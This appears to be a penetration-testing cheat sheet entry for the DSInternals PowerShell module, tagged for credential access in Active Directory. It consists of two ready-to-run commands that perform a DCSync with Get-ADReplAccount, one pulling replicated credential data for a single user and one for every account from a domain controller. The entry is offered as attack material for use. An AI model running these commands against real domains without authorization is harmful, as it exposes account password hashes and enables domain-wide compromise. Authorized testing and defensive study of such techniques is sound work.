# DSInternals

% DSInternals, , Active directory
#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## dcsync user
```powershell
Get-ADReplAccount -SamAccountName <user> -Server '<dc_name>'
```

## dcsync all
```powershell
Get-ADReplAccount -All -Server '<dc_name>'
```